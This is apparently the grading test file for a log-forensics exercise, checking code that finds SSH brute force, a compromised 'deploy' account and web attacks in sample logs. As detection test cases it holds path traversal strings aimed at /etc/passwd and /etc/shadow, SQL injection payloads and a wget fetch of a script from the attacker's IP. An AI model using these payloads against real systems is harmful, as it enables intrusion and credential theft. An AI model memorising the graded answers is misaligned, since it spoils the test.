"""Graded checks for sec-01-log-forensics."""

import json
from pathlib import Path

import pytest

DATA = Path(__file__).resolve().parent.parent / "data"
AUTH, ACCESS = DATA / "auth.log", DATA / "access.log"
ATTACKER = "203.0.113.45"


def fail_line(sec, ip="198.18.0.1", user="root"):
    return f"Mar 14 05:{sec // 60:02d}:{sec % 60:02d} web01 sshd[4242]: Failed password for {user} from {ip} port 5555 ssh2"


@pytest.mark.points(10)
def test_parse_auth_log(sol):
    """parse_auth_log turns sshd/sudo lines into events (failed, accepted, sudo)"""
    events = sol.parse_auth_log(AUTH, year=2024)
    kinds = [e["event"] for e in events]
    assert kinds.count("failed") == 70
    assert kinds.count("accepted") == 6
    assert kinds.count("sudo") == 4
    acc = [e for e in events if e["event"] == "accepted" and e["ip"] == ATTACKER]
    assert acc and acc[0]["time"] == "2024-03-14T04:03:41"
    assert acc[0]["user"] == "deploy" and acc[0]["method"] == "password"
    inv = [e for e in events if e["event"] == "failed" and e["ip"] == "192.0.2.99"][0]
    assert inv["user"] in {"admin", "test", "ubuntu"}, "for 'invalid user X' the user is X"
    # also accepts a list of lines
    assert len(sol.parse_auth_log([fail_line(1), "garbage line"], year=2024)) == 1


@pytest.mark.points(15)
def test_bruteforce_ips(sol):
    """detect_bruteforce finds the two fast attackers, not the slow scanner or bob's typos"""
    found = sol.detect_bruteforce(sol.parse_auth_log(AUTH), threshold=10, window_seconds=300)
    assert [b["ip"] for b in found] == ["192.0.2.99", ATTACKER]
    by_ip = {b["ip"]: b for b in found}
    assert by_ip[ATTACKER]["failures"] == 46
    assert by_ip[ATTACKER]["first_seen"] == "2024-03-14T03:58:08"
    assert by_ip[ATTACKER]["last_seen"] == "2024-03-14T04:02:15"
    assert by_ip["192.0.2.99"]["failures"] == 14
    assert by_ip[ATTACKER]["users_tried"] == ["admin", "deploy", "git", "root"]


@pytest.mark.points(10)
def test_bruteforce_window_logic(sol):
    """threshold and sliding window are applied exactly (>= threshold within window_seconds)"""
    nine = sol.parse_auth_log([fail_line(s) for s in range(0, 90, 10)])
    assert sol.detect_bruteforce(nine, threshold=10, window_seconds=300) == []
    ten = sol.parse_auth_log([fail_line(s) for s in range(0, 100, 10)])
    hit = sol.detect_bruteforce(ten, threshold=10, window_seconds=300)
    assert [h["ip"] for h in hit] == ["198.18.0.1"] and hit[0]["max_in_window"] == 10
    # 10 failures spread over 9 x 40s = 360s: never 10 inside 300s
    spread = sol.parse_auth_log([fail_line(s) for s in range(0, 400, 40)])
    assert sol.detect_bruteforce(spread, threshold=10, window_seconds=300) == []
    assert sol.detect_bruteforce(spread, threshold=10, window_seconds=360) != []
    slow = sol.detect_bruteforce(sol.parse_auth_log(AUTH), threshold=5, window_seconds=7200)
    assert "198.51.100.7" in [b["ip"] for b in slow], "a 2-hour window must catch the slow scanner"


@pytest.mark.points(15)
def test_compromise(sol):
    """find_compromises reports the account taken over, from where and when"""
    events = sol.parse_auth_log(AUTH)
    comps = sol.find_compromises(events, sol.detect_bruteforce(events))
    assert len(comps) == 1, "exactly one successful login came from a brute-force IP"
    c = comps[0]
    assert (c["user"], c["ip"], c["time"]) == ("deploy", ATTACKER, "2024-03-14T04:03:41")
    assert c["failures_before"] == 46


@pytest.mark.points(5)
def test_post_compromise_activity(sol):
    """post_compromise_activity lists the attacker's sudo commands (not alice's)"""
    events = sol.parse_auth_log(AUTH)
    post = sol.post_compromise_activity(events, sol.find_compromises(events, sol.detect_bruteforce(events)))
    assert [p["time"] for p in post] == ["2024-03-14T04:05:10", "2024-03-14T04:05:23", "2024-03-14T04:06:01"]
    assert post[0]["command"].startswith("/usr/bin/wget http://203.0.113.45/x.sh")
    assert all(p["user"] == "deploy" for p in post)


@pytest.mark.points(5)
def test_parse_access_log(sol):
    """parse_access_log reads nginx combined log lines"""
    reqs = sol.parse_access_log(ACCESS)
    assert len(reqs) == 129
    first = [r for r in reqs if r["ip"] == "198.51.100.23"][0]
    assert first["time"] == "2024-03-14T04:10:02"
    assert first["method"] == "GET" and first["path"] == "/download?file=../../../../etc/passwd"
    assert first["status"] == 200 and first["size"] == 1873
    assert first["user_agent"].startswith("sqlmap")


@pytest.mark.points(15)
def test_classify_request(sol):
    """classify_request decodes URLs (even double-encoded) and avoids false positives"""
    cases = {
        "/download?file=../../etc/passwd": ["path_traversal"],
        "/download?file=..%2F..%2Fetc%2Fshadow": ["path_traversal"],
        "/x?f=%252e%252e%252fetc%252fpasswd": ["path_traversal"],
        "/x?f=..%5c..%5cwindows%5cwin.ini": ["path_traversal"],
        "/products?id=1%27%20OR%20%271%27%3D%271": ["sqli"],
        "/products?id=1+UNION+SELECT+username,password+FROM+users--": ["sqli"],
        "/products?id=1 union all select 1,2,3": ["sqli"],
        "/login?user=admin%27--": ["sqli"],
        "/q?id=1+AND+SLEEP(5)": ["sqli"],
        "/search?q=test%27%3B+DROP+TABLE+orders%3B--": ["sqli"],
        "/": [],
        "/search?q=O%27Reilly+books": [],
        "/blog/how-to-select-the-best-union-jobs": [],
        "/docs/v1..v2-migration": [],
        "/search?q=rock+and+roll": [],
    }
    for path, expected in cases.items():
        assert sorted(sol.classify_request(path)) == expected, f"classify_request({path!r})"


@pytest.mark.points(10)
def test_web_attacks(sol):
    """find_web_attacks lists every malicious request from the access log"""
    attacks = sol.find_web_attacks(sol.parse_access_log(ACCESS))
    assert {a["ip"] for a in attacks} == {"198.51.100.23"}
    got = [(a["time"], a["attack"], a["status"]) for a in attacks]
    assert got == [
        ("2024-03-14T04:10:02", "path_traversal", 200),
        ("2024-03-14T04:10:09", "path_traversal", 403),
        ("2024-03-14T04:10:15", "path_traversal", 404),
        ("2024-03-14T04:10:21", "path_traversal", 400),
        ("2024-03-14T04:11:04", "sqli", 200),
        ("2024-03-14T04:11:11", "sqli", 500),
        ("2024-03-14T04:11:20", "sqli", 500),
        ("2024-03-14T04:11:35", "sqli", 302),
        ("2024-03-14T04:12:10", "sqli", 200),
    ]


@pytest.mark.points(10)
def test_timeline(sol):
    """build_timeline merges everything into one ordered incident timeline with a summary"""
    t = sol.build_timeline(AUTH, ACCESS)
    s = t["summary"]
    assert s["bruteforce_ips"] == ["192.0.2.99", ATTACKER]
    assert s["compromised_accounts"] == [{"user": "deploy", "ip": ATTACKER, "time": "2024-03-14T04:03:41"}]
    assert s["web_attacker_ips"] == ["198.51.100.23"]
    assert s["first_malicious_activity"] == "2024-03-14T03:30:09"
    assert s["successful_web_attacks"] == 3
    times = [e["time"] for e in t["events"]]
    assert times == sorted(times), "events must be in time order"
    types = [e["type"] for e in t["events"]]
    assert types.count("bruteforce") == 2 and types.count("compromise") == 1
    assert types.count("privilege_escalation") == 3
    assert types.count("sqli") == 5 and types.count("path_traversal") == 4
    for e in t["events"]:
        assert set(e) >= {"time", "source", "type", "ip", "detail"}
        assert e["source"] in {"auth", "web"}


@pytest.mark.points(5)
def test_write_timeline(sol, tmp_path):
    """write_timeline saves valid JSON that round-trips"""
    t = sol.build_timeline(AUTH, ACCESS)
    out = tmp_path / "incident.json"
    sol.write_timeline(t, out)
    assert json.loads(out.read_text(encoding="utf-8")) == t
